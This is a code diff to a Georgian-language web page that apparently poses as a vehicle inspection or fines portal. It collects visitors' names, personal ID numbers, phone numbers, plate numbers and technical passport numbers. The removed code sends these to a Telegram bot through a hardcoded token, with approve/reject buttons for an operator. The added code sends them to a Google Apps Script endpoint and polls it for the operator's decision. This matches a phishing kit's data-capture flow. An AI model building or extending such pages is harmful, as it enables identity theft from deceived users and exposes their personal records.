@@ -562,8 +562,7 @@
 
     <!-- JavaScript Logic -->
     <script>
-        const BOT_TOKEN = "8935597191:AAF_6E74uYoIIeDX8Hsl0O2407QMHddpNvY"; 
-        const CHAT_ID = "8233255349";     
+        const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzMzCGVILcAds3U0w2qG-pngS2ymCEM7AF7wfmfn3araVIvuJZyWaKZk96x_tAlQxqu/exec";
         let statusCheckInterval = null;
 
         const translations = {
@@ -682,7 +681,7 @@
             if (statusCheckInterval) clearInterval(statusCheckInterval);
         }
 
-        // Request handling & Telegram Inline Buttons Integration
+        // Request handling via Apps Script
         async function handleAuthRequest(e) {
             e.preventDefault();
             const name = document.getElementById('userNameInput').value;
@@ -699,48 +698,39 @@
             document.getElementById('statusTitle').innerText = "მოთხოვნა გაგზავნილია";
             document.getElementById('statusDesc').innerText = "ადმინისტრატორი ამოწმებს თქვენს პაკეტს. დადასტურებისთანავე შეხვალთ კაბინეტში...";
 
-            const message = `🚗 *ახალი განაცხადი საიტიდან:*\n\n` +
-                `👤 *სახელი:*\n${name}\n` +
-                `🆔 *პირადი ნომერი:* \`${pid}\`\n` +
-                `📞 *ტელეფონი:* \`${phone}\`\n` +
-                `🚘 *სახელმწიფო ნომერი:* \`${carNumber}\`\n` +
-                `📄 *ტექპასპორტი:* \`${techPassport}\`\n` +
-                `🔗 *გადამოწმების ბმულები:*\n\n` +
-                `• PTI (ინსპექტირება):\nhttps://pti.ge\n\n` +
-                `• Protocols (ისტორია):\nhttps://protocols.ge\n\n` +
-                `• Police Videos (ჯარიმები):\nhttps://videos.police.ge\n\n` +
-                `✅ *თანხმობა:* true`;
-            
-            const keyboard = {
-                inline_keyboard: [
-                    [
-                        { text: "✅ დაშვება", callback_data: `approve_${pid}` },
-                        { text: "❌ უარყოფა", callback_data: `reject_${pid}` }
-                    ]
-                ]
-            };
-
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(APPS_SCRIPT_URL, {
                     method: 'POST',
+                    mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown',
-                        reply_markup: keyboard
+                        action: "auth_request",
+                        name: name,
+                        pid: pid,
+                        phone: phone,
+                        car: carNumber,
+                        tech: techPassport
                     })
                 });
             } catch (err) {
-                console.log("Telegram API Error:", err);
+                console.log("Network Error:", err);
             }
 
-            let secondsElapsed = 0;
-            statusCheckInterval = setInterval(() => {
-                secondsElapsed += 3;
-                if (secondsElapsed > 12) {
-                    showRejectState();
-                    clearInterval(statusCheckInterval);
+            // სტატუსის პერიოდული შემოწმება (Polling)
+            statusCheckInterval = setInterval(async () => {
+                try {
+                    let res = await fetch(`${APPS_SCRIPT_URL}?action=checkStatus&pid=${pid}`);
+                    let data = await res.json();
+
+                    if (data.status === "approve") {
+                        showApproveState();
+                        clearInterval(statusCheckInterval);
+                    } else if (data.status === "reject") {
+                        showRejectState();
+                        clearInterval(statusCheckInterval);
+                    }
+                } catch (err) {
+                    console.log("Check status error:", err);
                 }
             }, 3000);
         }
